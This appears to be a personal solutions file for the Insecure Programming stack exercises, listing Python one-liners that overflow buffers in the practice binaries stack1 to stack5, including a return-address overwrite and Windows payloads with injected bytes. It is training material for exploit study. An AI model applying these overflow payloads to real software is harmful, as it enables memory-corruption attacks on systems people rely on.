This document is intended to contain all my solutions to the [Insecure Programming](https://github.com/deadbits/InsecureProgramming) excercises. I will update this document as I advance in the excercises.

####Stack excercises

1. `$ python -c "print 'A'*80 + chr(0x44) + chr(0x43) + chr(0x42) + chr(0x41)" | ./stack1`
2. `$ python -c "print 'A'*80 + chr(0x5) + chr(0x3) + chr(0x2) + chr(0x1)" | ./stack2`
3. `$ python -c "print 'A'*80 + chr(0x5) + chr(0x0) + chr(0x2) + chr(0x1)" | ./stack3`
4. This excercise it's a bit different, since one of the values being compared to `cookie` it's a newline (0xa). Because of this you can't, or at least I wasn't able to get the corresponding memory positions to be equal to the constant. Then, the idea is to directly overwrite the return address so it points where you need it. In order to do so, you need to overwrite more memory positions so you can reach the ones where the function's return address it's stored.
  
  `$ python -c "print 'A'*96 + chr(0xb9) + chr(0x84) + chr(0x04) + chr(0x08)" | ./stack4"`
  
  Note: This solution was tested in Linux. This may not work for you (the distance between the buffer and the location of the return addres may vary. 
5. `$ python -c "print 'you win\x00' + '\x90\xcc' + '\x68\xf4\xfe\x18\x00' + '\xff\x15\x8c\x20\x40\x00' + 'A' * 67 + chr(0xfc) + chr(0xfe) + chr(0x18) + chr(0x0)" | stack5.exe`
  
  `$ python -c "print 'you win\x21\x00' + '\x68\xf4\xfe\x18\x00' + '\xff\x15\x8c\x20\x40\x00' + 'A' * 68 + '\xfd\xfe\x18\x00'" | stack2.exe`
  
  Note: The same as ex 4 but for Windows.
